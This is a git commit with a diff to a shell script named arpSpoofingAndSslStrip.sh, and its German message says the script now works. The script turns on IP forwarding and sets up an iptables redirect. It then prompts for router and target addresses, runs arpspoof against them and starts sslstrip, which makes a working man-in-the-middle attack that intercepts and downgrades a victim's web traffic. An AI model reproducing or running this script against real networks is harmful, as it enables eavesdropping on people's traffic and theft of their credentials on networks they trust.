43ac62f5da81f474fa196771d9db770ba6fda504
root <root@localhost.localdomain>
2018-05-03 16:34:09 +0200

    arpSpoofingAndSslStrip.sh funktioniert jetzt

--- arpSpoofingAndSslStrip.sh
+++ arpSpoofingAndSslStrip.sh
@@ -6,11 +6,20 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 #Nat konfigurieren
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 
-Router_IP = $(read -p "Router IP?")
+echo "Router IP?"
 
-Target_IP = $(read -p "Target IP?")
+read RouterIP
+
+echo $RouterIP
+
+echo "Target IP?"
+
+read TargetIP
+
+echo $TargetIP
+
 #arpspoofing aktivieren
-arpspoof -i eth0 -r -t $Router_IP $Target_IP
+arpspoof -i eth0 -r -t $RouterIP $TargetIP &
 
 #arpspoofing mit ssl strip kombinieren
 sslstrip -l 8080
